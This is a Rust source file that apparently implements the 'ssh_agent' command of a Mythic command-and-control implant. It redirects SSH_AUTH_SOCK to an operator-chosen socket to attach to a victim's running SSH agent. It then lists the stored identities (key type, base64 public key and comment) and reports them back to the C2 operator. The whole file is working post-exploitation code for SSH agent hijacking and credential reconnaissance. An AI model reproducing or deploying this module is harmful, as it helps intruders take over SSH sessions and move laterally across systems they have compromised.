use crate::agent::AgentTask;
use crate::mythic_success;
use serde::Deserialize;
use ssh2::Session;
use std::env;
use std::error::Error;
use std::ffi::CStr;
use std::result::Result;

/// Struct containing the ssh agent args from Mythic
#[derive(Debug, Deserialize)]
struct SshAgentArgs {
    list: bool,
    connect: Option<String>,
    disconnect: bool,
}

/// Initial function call to parse what action to take
/// * `task` - Mythic task information
pub fn ssh_agent(task: &AgentTask) -> Result<serde_json::Value, Box<dyn Error>> {
    // Parse the task arguments
    let args: SshAgentArgs = serde_json::from_str(&task.parameters)?;

    // Check if the user wants to list agent identities
    let user_output = if args.list {
        agent_list(&task.id)?
    } else if let Some(ref path) = args.connect {
        // Check if the user wants to connect to an agent
        agent_connect(&task.id, path)?
    } else if args.disconnect {
        // Check if the user wants to disconnect from the ssh agent
        agent_disconnect(&task.id)?
    } else {
        mythic_success!(task.id, "Invalid arguments")
    };

    Ok(user_output)
}

/// Connects to a running SSH agent unix socket
/// * `id` - Task ID
/// * `socket` - Path to SSH socket
fn agent_connect(id: &str, socket: &str) -> Result<serde_json::Value, Box<dyn Error>> {
    // Grab the currently set SSH_AUTH_SOCK if it exists
    let orig_agent = env::var("SSH_AUTH_SOCK");

    // Set the new SSH_AUTH_SOCK path
    env::set_var("SSH_AUTH_SOCK", socket);

    // Test to see if the ssh agent can be connected to
    let sess = match Session::new() {
        Ok(s) => s,
        Err(e) => {
            // Set the SSH_AUTH_SOCK back to what it originally was if there was an error
            if let Ok(orig_socket) = orig_agent {
                env::set_var("SSH_AUTH_SOCK", orig_socket);
            } else {
                env::remove_var("SSH_AUTH_SOCK");
            }

            return Err(e.into());
        }
    };

    let mut agent = match sess.agent() {
        Ok(a) => a,
        Err(e) => {
            // Set the SSH_AUTH_SOCK back to what it originally was if there was an error
            if let Ok(orig_socket) = orig_agent {
                env::set_var("SSH_AUTH_SOCK", orig_socket);
            } else {
                env::remove_var("SSH_AUTH_SOCK");
            }

            return Err(e.into());
        }
    };

    if let Err(e) = agent.connect() {
        if let Ok(orig_socket) = orig_agent {
            env::set_var("SSH_AUTH_SOCK", orig_socket);
        } else {
            env::remove_var("SSH_AUTH_SOCK");
        }

        return Err(e.into());
    }

    // Return a successs
    Ok(mythic_success!(id, "Successfully connected to ssh agent"))
}

/// List identities in the currently connected ssh agent
/// * `id` - Task Id
fn agent_list(id: &str) -> Result<serde_json::Value, Box<dyn Error>> {
    // Check if the SSH_AUTH_SOCK variable is set
    if env::var("SSH_AUTH_SOCK").is_err() {
        return Err("Not connected to any ssh agent".into());
    }

    // Connect to the ssh agent
    let sess = Session::new()?;
    let mut agent = sess.agent()?;
    agent.connect()?;

    // List the stored identities
    agent.list_identities()?;
    let keys = agent.identities()?;

    // Check if there is at least 1 identity
    let user_output = if !keys.is_empty() {
        let mut tmp = String::new();

        // Loop over each identity extracting the public key and comment
        for key in keys {
            let raw_blob = key.blob();
            let key_type = unsafe { CStr::from_ptr(raw_blob[4..].as_ptr() as *const i8) };
            let b64_blob = base64::encode(raw_blob);

            tmp.push_str(
                format!(
                    "Key type: {}\nbase64 blob: {}\nComment: {}\n\n",
                    key_type.to_str()?,
                    b64_blob,
                    key.comment()
                )
                .as_str(),
            );
        }
        tmp
    } else {
        "No identities in ssh agent".to_string()
    };

    // Send the output to Mythic
    Ok(mythic_success!(id, user_output))
}

/// Disconnect from the currently connected ssh agent
/// * `id` - Task Id
fn agent_disconnect(id: &str) -> Result<serde_json::Value, Box<dyn Error>> {
    env::remove_var("SSH_AUTH_SOCK");
    Ok(mythic_success!(id, "Disconnected from ssh agent"))
}
